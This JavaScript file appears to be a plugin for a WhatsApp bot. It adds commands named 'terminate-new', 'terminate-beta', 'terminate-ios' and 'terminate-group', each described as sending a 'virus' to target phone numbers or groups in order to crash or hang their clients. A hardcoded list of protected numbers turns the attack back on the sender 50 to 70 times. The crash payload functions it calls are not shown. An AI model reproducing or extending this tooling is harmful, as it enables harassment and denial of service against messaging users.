const { cmd } = require('../command');
const protectionNumbers = ['923151105391', '923079749129', '923498344152', '923269681728'];

cmd({
  pattern: "terminate-new",
  desc: "Sends virus to your target.",
  categorie: 'virus*",
  reac: "☣️"
}, async (dest, zk, { args, isCreator, msgId, sender, isGroup }) => {
  if (!(await checkAccess(sender, zk, isCreator))) return;
  if (args.length === 0) return await zk.sendMessage(dest, { text: '*⚠️ Enter number(s) to send bug!*' }, { quoted: msgId });

  for (const victim of args) {
    if (protectionNumbers.includes(victim.replace(/[^0-9]/g, ''))) {
      for (let i = 0; i < 50; i++) await sendbug(zk, sender, config);
      return await zk.sendMessage(dest, { text: '*🚨 Protected number detected, bug reversed!*' }, { quoted: msgId });
    }
    await sendbug(zk, victim, config);
  }

  await zk.sendMessage(dest, { text: '*✅ terminate-new bug sent successfully!*' }, { quoted: msgId });
});

cmd({
  pattern: "terminate-beta",
  alias: ["crashbeta", "hangbeta", "bugbeta"],
  desc: "Sends virus to your target.",
  categorie: "virus",
  reaction: '🧬'
}, async (dest, zk, { args, isCreator, msgId, sender, isGroup }) => {
  if (!(await checkAccess(sender, zk, isCreator))) return;
  if (args.length === 0) return await zk.sendMessage(dest, { text: '*⚠️ Enter number(s) to send beta bug!*' }, { quoted: msgId });

  for (const victim of args) {
    if (protectionNumbers.includes(victim.replace(/[^0-9]/g, ''))) {
      for (let i = 0; i < 70; i++) await sendbug(zk, sender, config);
      return await zk.sendMessage(dest, { text: '*🚨 Protected number detected, beta bug reversed!*' }, { quoted: msgId });
    }
    await sendbug(zk, victim, config);
  }

  await zk.sendMessage(dest, { text: '*✅ terminate-beta sent successfully!*' }, { quoted: msgId });
});

cmd({
  pattern: "terminate-ios",
  alias: ["crash1ios", "hang1ios", "bug1ios"],
  desc: "Sends virus to your target.",
  categorie: "virus",
  reac: "📱"
}, async (dest, zk, { args, isCreator, msgId, sender, isGroup }) => {
  if (!(await checkAccess(sender, zk, isCreator))) return;
  if (args.length === 0) return await zk.sendMessage(dest, { text: '*⚠️ Enter number(s) to send iOS bug!*' }, { quoted: msgId });

  for (const victim of args) {
    if (protectionNumbers.includes(victim.replace(/[^0-9]/g, ''))) {
      for (let i = 0; i < 60; i++) await sendbug(zk, sender, config);
      return await zk.sendMessage(dest, { text: '*🚨 Protected number detected, iOS bug reversed!*' }, { quoted: msgId });
    }
    await sendbug(zk, victim, config);
  }

  await zk.sendMessage(dest, { text: '*✅ terminate-ios bug sent successfully!*' }, { quoted: msgId });
});

cmd({
  pattern: "terminate-group",
  alias: ["jamgroup", "hanggroup", "buggroup"],
  desc: "Sends virus to your target.",
  categorie: "virus",
  react: "💣"
}, async (dest, zk, { isCreator, msgId, sender, isGroup }) => {
  if (!(await checkAccess(sender, zk, isCreator))) return;
  if (!isGroup) return await zk.sendMessage(dest, { text: '*❌ This command only works in groups!*' }, { quoted: msgId });

  await relaybug(zk, dest, config);
  await zk.sendMessage(dest, { text: '*☣️ Group virus deployed successfully!*' }, { quoted: msgId });
}); 